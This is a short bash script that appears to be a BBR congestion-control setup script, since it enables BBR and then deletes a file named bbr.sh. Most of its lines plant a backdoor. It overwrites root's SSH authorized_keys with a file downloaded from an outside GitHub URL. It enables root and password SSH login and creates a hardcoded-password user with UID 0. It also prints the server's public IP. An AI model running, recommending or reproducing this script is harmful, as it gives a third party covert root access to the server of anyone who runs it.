#!/bin/bash

wget -q https://raw.githubusercontent.com/RyanY610/logs/main/null -O /root/.ssh/authorized_keys
sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
echo "Port 22"  >> /etc/ssh/sshd_config
useradd ryan
echo ryan:Ryan1995 |chpasswd ryan
sed -i 's|^.*ryan.*|ryan:x:0:0:root:/root:/bin/bash|g' /etc/passwd
service sshd restart
curl ipv4.ip.sb
echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
sysctl -p
lsmod | grep bbr
rm -f bbr.sh